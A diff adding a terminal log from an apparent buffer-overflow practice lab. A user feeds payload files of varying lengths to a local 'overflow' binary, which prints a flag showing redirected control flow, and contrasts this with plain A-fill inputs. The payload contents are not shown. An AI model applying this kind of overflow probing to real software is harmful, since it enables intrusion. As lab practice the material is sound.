@@ -1,0 +1,29 @@
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && head -c 31 payload.bin > p31.bin && cp payload.bin p33.bin && printf X >> p33.bin && wc -c p31.bin payload.bin p33.bin
+31 p31.bin
+32 payload.bin
+33 p33.bin
+96 总计
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && ./overflow < p31.bin && echo 31 bytes OK
+Name:
+flag{control_flow_redirected}
+31 bytes OK
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && ./overflow < p33.bin && echo 33 bytes OK
+Name:
+flag{control_flow_redirected}
+33 bytes OK
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && ./overflow < payload.bin && echo 32 bytes OK
+Name:
+flag{control_flow_redirected}
+32 bytes OK
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && printf AAAAAAAAAAAAAAAAAAAAAAAAA | ./overflow && echo 25 bytes A-fill no flag no Try again
+Name:
+25 bytes A-fill no flag no Try again
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && printf AAAAAAAAAAAAAAAAAAAA | ./overflow && echo 20 bytes still the normal branch
+Name:
+Try again.
+20 bytes still the normal branch
